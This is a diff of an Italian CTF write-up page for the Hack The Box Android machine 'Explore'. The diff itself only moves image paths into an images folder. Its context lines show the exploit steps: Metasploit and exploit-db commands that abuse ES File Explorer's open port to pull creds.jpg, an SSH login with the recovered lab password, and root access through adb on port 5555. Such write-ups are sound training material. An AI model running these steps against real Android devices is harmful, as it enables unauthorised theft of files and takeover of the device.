@@ -152,7 +152,7 @@
 <li><a href="#privilage-escalation">Privilage Escalation</a></li>
 </ul>
 
-  <img src="https://kobra3390.github.io/SpaceHack/LogoExploreCTF.png"  class="left"  style="width: 300px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/LogoExploreCTF.png"  class="left"  style="width: 300px"  />
 
 
 <p>Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina.
@@ -282,19 +282,19 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 </code></pre></div><h1 id="analisi-delle-porte">Analisi delle porte<a href="#analisi-delle-porte" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Nmap rivela un server SSH in esecuzione sulla porta 2222, un servizio HTTP in esecuzione sulla porta 59777 (nel mio caso é 42135) e un servizio TCP filtrato in esecuzione sulla porta 5555. Cercando online la porta 5555, si ottiene il seguente:</p>
 
-  <img src="https://kobra3390.github.io/SpaceHack/Explore1.png"  class="left"  style="width: 600px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore1.png"  class="left"  style="width: 600px"  />
 
 
 <p>Questo sito web mostra le assegnazioni delle porte e le vulnerabilità note.</p>
 
-  <img src="https://kobra3390.github.io/SpaceHack/Explore2.png"  class="left"  style="width: 700px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore2.png"  class="left"  style="width: 700px"  />
 
 
 <p>Nello snippet di cui sopra possiamo vedere che la porta 5555 è utilizzata da Android Debug Bridge (ADB).
 Android Debug Bridge (adb) è uno strumento a riga di comando che consente agli utenti di comunicare con un dispositivo Android.
 Dato che la porta 5555 è filtrata e non è possibile connettersi tramite adb, cerchiamo online la porta 59777 che rivela il seguente risultato:</p>
 
-  <img src="https://kobra3390.github.io/SpaceHack/Explore3.png"  class="left"  style="width: 700px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore3.png"  class="left"  style="width: 700px"  />
 
 
 <p>Questa porta è utilizzata dall’applicazione ES File Explorer File Manager per Android, secondo questo sito web.
@@ -304,7 +304,7 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. msfconsole
 2. search es file explorer
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore4.png"  class="left"  style="width: 900px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore4.png"  class="left"  style="width: 900px"  />
 
 
 <p>Il modulo di interesse è:</p>
@@ -315,27 +315,27 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. use auxiliary/scanner/http/es_file_explorer_open_port
 2. options
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore5.png"  class="left"  style="width: 900px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore5.png"  class="left"  style="width: 900px"  />
 
 
 <p>Successivamente, si imposta il parametro RHOSTS con l’IP dell’host e si digita exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. set RHOSTS 10.10.10.247
 2. exploit
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore6.png"  class="left"  style="width: 600px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore6.png"  class="left"  style="width: 600px"  />
 
 
 <p>Il risultato è positivo. L’azione del parametro è stata impostata, per impostazione predefinita su GETDEVICEINFO e quindi l’uscita mostra informazioni sul dispositivo. Elenchiamo tutte le azioni di questo modulo.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">show actions
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore7.png"  class="left"  style="width: 500px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore7.png"  class="left"  style="width: 500px"  />
 
 
 <p>Impostando l’azione su LISTPICS, si ottengono i seguenti risultati.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">1. set action LISTPICS
 2. exploit
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore8.png"  class="left"  style="width: 700px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore8.png"  class="left"  style="width: 700px"  />
 
 
 <p>Questa istruzione sembra elencare tutte le immagini memorizzate nella directory DCIM del telefono. Impostiamo l’azione su GETFILE e scarichiamo il file creds.jpg:</p>
@@ -343,7 +343,7 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
 3. exploit
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore9.png"  class="left"  style="width: 700px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore9.png"  class="left"  style="width: 700px"  />
 
 
 <p>Successivamente, possiamo aprire l’immagine utilizzando il visualizzatore di immagini feh:</p>
@@ -352,25 +352,25 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 </code></pre></div><h2 id="sfruttamento-dellexploit-con-cve-script-python">Sfruttamento dell’Exploit con CVE (Script Python)<a href="#sfruttamento-dellexploit-con-cve-script-python" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Effettuando delle ricerce sul ES File Explorer 4.1.9.7.4 troviamo la seguente pagina di Exploit Databse:</p>
 
-  <img src="https://kobra3390.github.io/SpaceHack/Explore10.png"  class="left"  style="width: 700px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore10.png"  class="left"  style="width: 700px"  />
 
 
 <p>Salviamo il codice di questo exploit. ES File Explorer crea un servizio HTTP associato alla porta 59777 in fase di esecuzione, che fornisce oltre 10 comandi per l’accesso ai dati nel telefono cellulare dell’utente e l’esecuzione dell’applicazione; tuttavia, il servizio non controlla questa richiesta. Eseguendo l’exploit usando python3 otteniamo un elenco di comandi disponibili che possiamo effettivamente eseguire usando quell’exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py --cmd GetDeviceInfo --ip <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span>
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore11.png"  class="left"  style="width: 600px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore11.png"  class="left"  style="width: 600px"  />
 
 
 <p>Innanzitutto, possiamo provare a cercare le credenziali memorizzate in Pics o in Files:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py listPics <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span>
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore12.png"  class="left"  style="width: 500px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore12.png"  class="left"  style="width: 500px"  />
 
 
 <p>Possiamo accedere ai file utilizzando il nostro browser o scaricandoli singolarmente. C’è un file chiamato creds.jpg che possiamo scaricare usando il comando come segue:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 <span style="color:#f92672">[</span>script<span style="color:#f92672">]</span>.py getFile <span style="color:#f92672">[</span>address<span style="color:#f92672">]</span> /storage/emulated/0/DCIM/creds.jpg
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore13.png"  class="left"  style="width: 600px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore13.png"  class="left"  style="width: 600px"  />
 
 
 <p>Entrambe le strade viste portano al medesimo risultato, ossia avere questo file con le credenziali ssh:</p>
@@ -381,12 +381,12 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 <p>Questo sembra un notebook con la password Kr1sT!5h@Rp3xPl0r3! per l’utente kristi. Utilizziamo queste credenziali e proviamo ad accedere tramite SSH alla porta 2222 che abbiamo trovato in precedenza.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh kristi@10.10.10.247 -p <span style="color:#ae81ff">2222</span>
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore15.png"  class="left"  style="width: 600px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore15.png"  class="left"  style="width: 600px"  />
 
 
 <p>La flag user.txt si trova in /storage/emulated/0/user.txt:</p>
 
-  <img src="https://kobra3390.github.io/SpaceHack/Explore16.png"  class="left"  style="width: 600px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore16.png"  class="left"  style="width: 600px"  />
 
 
 <h1 id="privilage-escalation">Privilage Escalation<a href="#privilage-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
@@ -400,25 +400,25 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
 </code></pre></div><p>Nella sezione rete vediamo che utilizzando l’istruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adb connect 127.0.0.1:5555
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore17.png"  class="left"  style="width: 500px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore17.png"  class="left"  style="width: 500px"  />
 
 
 <p>È possibile elencare i dispositivi collegati eseguendo il seguente comando:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adb devices
 </code></pre></div>
-  <img src="https://kobra3390.github.io/SpaceHack/Explore18.png"  class="left"  style="width: 500px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore18.png"  class="left"  style="width: 500px"  />
 
 
 <p>Quindi, si può digitare quanto segue per ottenere la shell sulla macchina remota:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adb -s 127.0.0.1 shell
 </code></pre></div><p>Digitiamo “su” per diventare utenti root:</p>
 
-  <img src="https://kobra3390.github.io/SpaceHack/Explore19.png"  class="left"  style="width: 300px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore19.png"  class="left"  style="width: 300px"  />
 
 
 <p>Nella directory data vi sará la nostra flag:
 
-  <img src="https://kobra3390.github.io/SpaceHack/Explore20.png"  class="left"  style="width: 300px"  />
+  <img src="https://kobra3390.github.io/SpaceHack/images/Explore20.png"  class="left"  style="width: 300px"  />
 
 </p>
 
